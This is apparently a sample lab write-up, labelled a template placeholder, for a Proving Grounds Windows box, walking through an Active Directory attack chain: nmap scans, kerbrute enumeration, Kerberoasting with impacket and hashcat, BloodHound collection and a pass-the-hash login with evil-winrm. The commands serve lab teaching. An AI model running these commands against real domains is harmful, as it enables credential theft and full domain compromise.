---
title: "Sample Box — Active Directory Kerberoast to Domain Admin"
date: 2025-05-18
platform: Proving Grounds
difficulty: Medium
os: Windows
ip: 10.10.11.77
tools: [nmap, BloodHound, impacket, hashcat, evil-winrm]
tags: [active-directory, kerberoasting, bloodhound, lateral-movement]
description: >
  An Active Directory walkthrough: anonymous SMB enumeration yields a username
  list, a Kerberoastable service account cracks offline, and a BloodHound path
  leads from a low-privilege user to Domain Admin.
---

> A second **example writeup** — having two lets you see the card grid and the
> platform/difficulty filter on the Writeups page in action. Replace with your own.

## Reconnaissance

```bash
nmap -p- --min-rate 4000 10.10.11.77 -oN scans/all.txt
nmap -p 53,88,135,139,389,445,464,636,3268,5985 -sCV 10.10.11.77 -oN scans/dc.txt
```

The signature spread of Kerberos (`88`), LDAP (`389`), and SMB (`445`) confirms this is a **Domain Controller**.

## Enumeration

Anonymous SMB access exposes a readable share containing an onboarding document with a list of employee names — enough to build a username list and confirm valid accounts.

```bash
# Confirm which usernames are valid via Kerberos pre-auth
kerbrute userenum -d corp.local --dc 10.10.11.77 users.txt
```

## Kerberoasting

One valid account has a Service Principal Name set, making it **Kerberoastable**. I request the service ticket and crack it offline:

```bash
impacket-GetUserSPNs corp.local/jdoe:'Password1' \
  -dc-ip 10.10.11.77 -request -outputfile hashes.kerb

hashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt
```

<div class="callout warn"><span class="ic">NOTE</span><p>Kerberoasting works because any authenticated domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's password hash — crackable offline with zero further interaction, and silent on the wire.</p></div>

## Mapping the path with BloodHound

With cracked service-account creds I collect graph data and let BloodHound find the shortest path to high value:

```bash
bloodhound-python -u svc_sql -p 'CrackedPass!' \
  -d corp.local -dc dc01.corp.local -c All
```

BloodHound reveals the service account has `WriteDACL` over a group that is nested into **Domain Admins** — a clean abuse chain.

## Lateral movement &amp; escalation

Abusing the ACL, I add a controlled user to the privileged group, then authenticate over WinRM:

```bash
evil-winrm -i 10.10.11.77 -u administrator -H <ntlm-hash>
```

<div class="callout crit"><span class="ic">DA</span><p>Domain Admin achieved. From an anonymous SMB share to full domain compromise — the entire chain relied on default-but-dangerous AD configurations, not a single CVE.</p></div>

## Takeaways

- BloodHound turns AD from a guessing game into a graph problem. Collect early.
- Kerberoasting + weak service-account passwords is still one of the most reliable AD footholds.
- ACL misconfigurations (`WriteDACL`, `GenericAll`) are the quiet killers — they don't show up in a vuln scan.
